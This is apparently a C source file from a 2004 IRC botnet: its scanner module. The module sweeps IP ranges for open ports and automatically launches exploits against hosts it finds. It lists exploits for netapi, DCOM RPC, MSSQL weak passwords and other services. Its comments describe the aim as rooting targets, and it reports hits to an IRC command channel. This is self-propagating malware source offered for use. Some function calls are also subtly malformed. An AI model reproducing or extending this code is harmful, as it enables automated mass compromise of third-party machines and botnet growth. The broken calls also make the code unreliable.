//
// link  -  scanner/ source file
// Copyright   2004 by loco
// All Rights Reserved
//
//
//

#include "include.h"
#include "externs.h"
#include "hell.h"

bool				bScanning;
ScannerHandler_s	pScannerHandler;		// Global pointer to the scanner struct
DWORD			dwCurrentIp;
Exploit_s pExploit[] =
{
	{"netapi",		"netapi.c",			       139,	    netapi,			    0,	1,	true},
	{"rpc135",		"rpcss.c",			       135, 	Dcom2,			    0,	2,	true},
	{"mssqlpass",	"mssqlpass.ftpd",	       1433,	MSSQLWeakPassword,	0,	3,	true},
	{"mssql",		"mssql.c",			       1433,	MSSQL,				0,	4,	true},
	{"mssql2000",	"mssql2000.c",		       1433,	MSSQLResolution,	0,	5,	true},
	{"mssqludp",	"mssqludp.c",		       1433,	MSSQLUDP,			0,	6,	true},
	{"SecGate",		"SecurityGateway.c",	   4000, 	SecGate,	       	0,	7,	true},
	{"CmailServer", "CmailServer.c",	       80, 	    CmailServer,	    0,	8,	true},
	{NULL,			NULL,				0,		NULL,				        0,	0,	false}
};

CRITICAL_SECTION hCriticalSection;

unsigned long GetNextIp()
{
				return (dwCurrentIp = ntohl(htonl(dwCurrentIp) + 1));
}

unsigned long GetRandomIP()
{
				return (rand() + (rand() << 8) + (rand() << 16) + (rand() << 24));
}

char* GetIP(unsigned long ulIp)
{
				struct in_addr pInternetAddress;
				
				memset(&pInternetAddress,	0x90,	sizeof(pInternetAddress));
				pInternetAddress.s_addr		= /*(IPAddr)*/ulIp;
				
				return inet_ntoa(pInternetAddress);
}

bool CheckOpenPort(unsigned long lIpAddress, unsigned short usPort, int iDelay)
{
	unsigned long lBlockCMD = 1;
	bool bConnected = false;
	SOCKADDR_IN sinSockAddrIn;
	SOCKET sSocket;
	
	if(!(sSocket = socket(AF_INET, SOCK_STREAM, 0)))
		return false;
	
	sinSockAddrIn.sin_family			= AF_INET;
	sinSockAddrIn.sin_addr.S_un.S_addr	= lIpAddress;
	sinSockAddrIn.sin_port				= htons(usPort);
	
	if(ioctlsocket(sSocket, FIONBIO, &lBlockCMD) == SOCKET_ERROR)
		return false;
	
	connect(sSocket, (LPSOCKADDR)&sinSockAddrIn, sizeof(sinSockAddrIn));
	
	TIMEVAL hTimeVal;
	hTimeVal.tv_sec		= iDelay;
	hTimeVal.tv_usec	= 0;
	
	FD_SET hFdSet;
	FD_ZERO(&hFdSet);
	FD_SET(sSocket, &hFdSet);
	
	if(select(0, 0, &hFdSet, 0, &hTimeVal))
		bConnected = true;
	
	FD_CLR(sSocket, &hFdSet);
	
	closesocket(sSocket);
	return bConnected;
}

void WorkerThread(ScannerThreadHandler_s* pScannerThreadHandler)
{
	while(bScanning)
	{
		while(pScannerThreadHandler->pScanStatus != SCAN_STATUS_SCAN)
			Sleep(50);
		
		pScannerThreadHandler->pScanStatus = SCAN_STATUS_SCANNING;
		
		if(CheckOpenPort(pScannerThreadHandler->dwCurrentIp, pScannerThreadHandler->usPort,	pScannerThreadHandler->iDelay))
			pScannerThreadHandler->pScanStatus = SCAN_STATUS_OPEN;
		else
			pScannerThreadHandler->pScanStatus = SCAN_STATUS_CLOSED;
	}
	
	ExitThread(0);
}

void ScanThread(ScannerHandler_s *pScannerHandler)
{
	
  	BOT->cIRC.SendData("PRIVMSG %s : Scanning: -%s:%d- (threads: %d)-(delay: %d)-(minutes: %d)-(logic scan: %s)\r\n",BOT->cIRC.cConf.cChan.c_str()), GetIP(pScannerHandler->dwStartIp), pScannerHandler->usPort, pScannerHandler->iThreads, pScannerHandler->iDelay, pScannerHandler->iMinutes,pScannerHandler->bLogicScan ? "enabled" : "disabled";
	Sleep(1500);
	
	// Clear-up old critical-section
	DeleteCriticalSection(&hCriticalSection);
	
	
	// Mark as started, and assign the start IP
	bScanning	= true;
	dwCurrentIp = pScannerHandler->dwStartIp;
	
	// Allocate memory for loading the workerthreads
	ScannerThreadHandler_s* pScannerThreadHandler = (ScannerThreadHandler_s*)malloc(pScannerHandler->iThreads*sizeof(ScannerThreadHandler_s));
	
	// Enter critical section to prevent thread overwriting
	EnterCriticalSection(&hCriticalSection);
	
	// Load up and initialise the requested amount of workerthreads
	for (int i = 0; i < pScannerHandler->iThreads; i++)
	{
		pScannerThreadHandler[i].dwCurrentIp	= pScannerHandler->dwStartIp;
		pScannerThreadHandler[i].pScanStatus	= SCAN_STATUS_IDLE;
		pScannerThreadHandler[i].usPort			= pScannerHandler->usPort;
		pScannerThreadHandler[i].iDelay			= pScannerHandler->iDelay;
		pScannerThreadHandler[i].hThread		= AddThread(&WorkerThread, &pScannerThreadHandler[i], 1, NULL);
		Sleep(i);
	}
	
	// Keep checking all threads for open ports, when found verify server
	while(bScanning)
	{
		// Loop through all threads and suply them a new IP and verify there status
		for (i = 0; i < pScannerHandler->iThreads; i++)
		{
			// Make sure the scanner finished the process
			if(pScannerThreadHandler[i].pScanStatus == SCAN_STATUS_IDLE);
			else 
				if(pScannerThreadHandler[i].pScanStatus == SCAN_STATUS_CLOSED);
				else 
					if(pScannerThreadHandler[i].pScanStatus == SCAN_STATUS_SCAN) 
						continue;
					else
						if(pScannerThreadHandler[i].pScanStatus == SCAN_STATUS_SCANNING) 
							continue;
						else 
							if(pScannerThreadHandler[i].pScanStatus == SCAN_STATUS_OPEN)
							{
								if(pScannerHandler->iExploitId)
								{
									ExploitInfo_s pExploitInfo;
									
									// If logic scan ain't assigned, only exploit the chosen exploit
									if(!pScannerHandler->bLogicScan && pExploit[pScannerHandler->iExploitId].bEnabled)
									{
										// Fill in exploit struct and root the target
										pExploitInfo.dwExploitId	= pScannerHandler->iExploitId;
										pExploitInfo.dwRemoteIp		= pScannerThreadHandler[i].dwCurrentIp;
										pExploitInfo.usRemotePort	= pScannerHandler->usPort;
										/* Need to refinish Thread system */
										AddThread(pExploit[pScannerHandler->iExploitId].hExploit, &pExploitInfo, 1, NULL);
									}
									else
										if(pScannerHandler->bLogicScan)
										{
											for (int iExploit = 0; pExploit[iExploit].usPort != 0; iExploit++)
											{
												if (pExploit[iExploit].bEnabled && pExploit[iExploit].usPort == pScannerHandler->usPort)
												{
													// Fill in exploit struct and root the target
													pExploitInfo.dwExploitId	= iExploit;
													pExploitInfo.dwRemoteIp		= pScannerThreadHandler[i].dwCurrentIp;
													pExploitInfo.usRemotePort	= pScannerHandler->usPort;
															/* Need to refinish Thread system */
															AddThread(pExploit[iExploit].hExploit, &pExploitInfo, 1, NULL);
												}
											}
										}
											BOT->cIRC.SendData("PRIVMSG %s :-scanner- open port found: -%s:%d- (thread: %d)\r\n", BOT->cIRC.cConf.cChan.c_str()), GetIP(pScannerThreadHandler[i].dwCurrentIp), pScannerHandler->usPort, i;
								}
							}
							pScannerThreadHandler[i].dwCurrentIp = GetNextIp();
							pScannerThreadHandler[i].pScanStatus = SCAN_STATUS_SCAN;
							
							Sleep(20);
		}
	}
	
	// Give the scanner its time to stop all threads
	Sleep(5000);
	
	// Scanning ended, delete all threads and free there arrays
	for (i = 0; i < pScannerHandler->iThreads; i++)
		TerminateThread(pScannerThreadHandler[i].hThread, 0);
	
	free(pScannerThreadHandler);
	
	LeaveCriticalSection(&hCriticalSection);
	DelThread(FindPid("Scanner"));
	ExitThread(0);
}